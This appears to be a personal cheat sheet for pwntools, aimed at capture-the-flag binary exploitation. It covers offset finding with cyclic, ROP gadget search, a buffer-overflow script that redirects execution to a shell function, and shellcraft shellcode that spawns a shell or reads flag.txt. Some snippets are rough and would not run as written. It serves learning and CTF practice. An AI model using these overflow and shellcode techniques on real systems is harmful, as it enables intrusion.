# Pwntools

## Introduction

This not a template or more a condensed guide to things you can do, [[RTFM]] is important, but this is stuff to remind me to [[RTFM]] as `pwntools` is very powerful. 
#### Installation
```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

#### CLI binaries
- [pwn asm](https://docs.pwntools.com/en/stable/commandline.html#pwn-asm)
- [pwn checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec)
- [pwn constgrep](https://docs.pwntools.com/en/stable/commandline.html#pwn-constgrep)
- [pwn cyclic](https://docs.pwntools.com/en/stable/commandline.html#pwn-cyclic)
- [pwn debug](https://docs.pwntools.com/en/stable/commandline.html#pwn-debug)
- [pwn disablenx](https://docs.pwntools.com/en/stable/commandline.html#pwn-disablenx)
- [pwn disasm](https://docs.pwntools.com/en/stable/commandline.html#pwn-disasm)
- [pwn elfdiff](https://docs.pwntools.com/en/stable/commandline.html#pwn-elfdiff)
- [pwn elfpatch](https://docs.pwntools.com/en/stable/commandline.html#pwn-elfpatch)
- [pwn errno](https://docs.pwntools.com/en/stable/commandline.html#pwn-errno)
- [pwn hex](https://docs.pwntools.com/en/stable/commandline.html#pwn-hex)
- [pwn libcdb](https://docs.pwntools.com/en/stable/commandline.html#pwn-libcdb)
- [pwn libcdb file](https://docs.pwntools.com/en/stable/commandline.html#pwn-libcdb-file)
- [pwn libcdb hash](https://docs.pwntools.com/en/stable/commandline.html#pwn-libcdb-hash)
- [pwn libcdb lookup](https://docs.pwntools.com/en/stable/commandline.html#pwn-libcdb-lookup)
- [pwn phd](https://docs.pwntools.com/en/stable/commandline.html#pwn-phd)
- [pwn pwnstrip](https://docs.pwntools.com/en/stable/commandline.html#pwn-pwnstrip)
- [pwn scramble](https://docs.pwntools.com/en/stable/commandline.html#pwn-scramble)
- [pwn shellcraft](https://docs.pwntools.com/en/stable/commandline.html#pwn-shellcraft)
- [pwn template](https://docs.pwntools.com/en/stable/commandline.html#pwn-template)
- [pwn unhex](https://docs.pwntools.com/en/stable/commandline.html#pwn-unhex)
- [pwn update](https://docs.pwntools.com/en/stable/commandline.html#pwn-update)
- [pwn version](https://docs.pwntools.com/en/stable/commandline.html#pwn-version)

#### Useful pwntools

All of pwntools is useful [[RTFM]]; in a linearly from `import` to shellcraft

[Context](https://docs.pwntools.com/en/stable/context.html) is powerful, global variable; use with remote for remote host and `gb.debug` to pipe to `gdb`!
```python
# context.terminal = ['alacritty', '-e', 'zsh', '-c'] 
context(terminal=['tmux', 'new-window'])
target = './'
# context(os='linux', arch='amd64')
context.binary = target
context.log_level = 'info' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)
```

Connection
```python
# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
sh_pass = '!'
ssh_port = 22

# Remote(rhost, rport)
rhost = ''
rport = -1
```

`LD_Preload`
```python
# LD_Preload in pwntool
libc = ELF(<name>)
main = ELF(<name>)
r = main.process(env={'LD_PRELOAD' : libc.path})
```

GDB scripting
```python
# GDB debugs the parent process when process forks, but if we need the  follow the child process in gdb:
gdb.attach(p, '''
set follow-fork-mode child
continue
''')
# NOASLR

```

Enumeration
```bash
r < <(cyclic $INT) # cyclic input of $INT amount
cyclic -l EIP_Address # find out the amount of bytes of input need to expploit the binary
disassemble shell # find out where the shell function is in memory to set it to IP
# EITHER
# IF MANUAL WAY REMEMBER CORRECT ADDRESS LENGTH AND ENDIANNESS
# L->R = littleEndian; R->L = bigEndian
python -c 'print "A"*$INT + "$ADDR"' | /vuln/bin
python -c 'import struct;print "A"*44 + struct.pack("< ", $ADDR)' | /vuln/bin
```


```python
def enum_eip(payload):
    pwn = process(binary)
    pwn.sendlineafter('>', payload)
    pwn.wait()
    # ip_offset = cyclic_find(pwn.corefile.pc) # x86
    ip_offset = cyclic_find(pwn.corefile.read(pwn.corefile.sp, 4)) # x64
    info('Located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = enum_eip(cyclic(1000))
# offset = 1337
```

Connection
```
```

Find functions for rop chains
```bash
# inside gdb with gef
gef> ropper --search r$num # for legacy-gef or requires gef-extras
# for cli
ropper -f $binary | grep $register_of_the_function # from commandline
# is the equivant
objdump -D $binary  | grep -i $ function_name
```

Packing
```python
p64() # pack 64 bits
```

Sending, receiving input and interactive shell
```python
import re

# sendline != sendlineS (the latter returns a string, but is slower)
pwn.sendline('\x0A'.encode()) # send an enter key
pwn.sendline(varOne + varTwo + varThree + ) # send variables linearly
pwn.recvuntil('until some string if it is a prompt')

# Get addresses - CryptoCat
# recvS() is like recv(), but returns a String
# recvlineS()
# recvline() -> bytes and is faster btw!
stack_addr = int(re.search(r"(0x[\w\d]+)", pwn.recvlineS()).group(0), 16)
info("stack address: %#x", stack_addr)

# Extract value after string
get = lambda x: [sh.recvuntil('{} : '.format(x)), int(sh.recvline())][1]
p = get('p')
```


Scripting the buffer overflow
```python
from pwn import *

proc = process('/vuln/bin')
elf = ELF('/vuln/bin')
shell_func = elf.symbols.shell # CHANGE WHATEVER FORMAT REQUIRED
payload = fit({$INT: shell_func })
proc.sendline(payload)
proc.interactive() # works with remote pops shell if part of payload
```

#### Shellcode with Shellcraft

List all install shellcode from shellcraft of specific architecture and OS 
```bash
shellcraft -l | grep $arch.$os
```

Payloads with lists, arrays:
```python
from pwn import *

# payload = flat({offset: stack_addr})
# payload = flat([padding, shellcode, stack_addr])

# shellcode = asm(shellcraft.popad()) # Pop all of the registers !!onto!! the stack in same order
# shellcode += asm(shellcraft.amd64.linux.sh())
shellcode += asm(shellcraft.amd64.linux.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode))
info("Compiled shellcode length: %#x", len(shellcode))
info("Compiled paddinglength: %#x", len(padding))

# Write payload to file
# write('payload-pwn', payload)


# Pop all of the registers onto the stack which i386 popad does, in the same order. Compiled with asm
popad_shellcode = asm(shellcraft.amd64.popad())
```

#### Templates from Legends

[Github - Gallopsled/pwntools-tutorial](https://github.com/Gallopsled/pwntools-tutorial/blob/master/walkthrough/shellcode-advanced/README.md) states on template best practice:
>And a few things to note about general "good style" for templates.
>
>- Use `common.label` instead of a constant label is preferred, since `common.label` ensures the label name is unique, even if the shellcode template is used multiple times.
>- Use the helper functions `mov`, `pushstr`, `syscall`, and the `syscall` wrappers (like `write` used below) instead of reinventing the wheel
    - On some architectures, these emit NULL- and newline-free shellcode
    - These themselves are just other shellcode templates with some logic
>- Any integer fields should be passed through `constants.eval` so that well-known constant values can be used instead.
    - `constants.eval("SYS_execve") ==> int`
    - `int(constants.SYS_execve) ==> int`
    - If you're just passing it to another template, e.g. `mov`, this is already handled for you.

It is probably a good idea **not** to copy templates, but to build your own as you learn features. For good ideas and recognition see these:

## References

[Github - Gallopsled/pwntools-tutorial](https://github.com/Gallopsled/pwntools-tutorial/blob/master/walkthrough/shellcode-advanced/README.md) 
[docs.pwntools.com](https://docs.pwntools.com/en/stable/)
[vulndev](https://notes.vulndev.io/wiki/redteam/templates)
[Crypto-Cat](https://github.com/Crypto-Cat/)
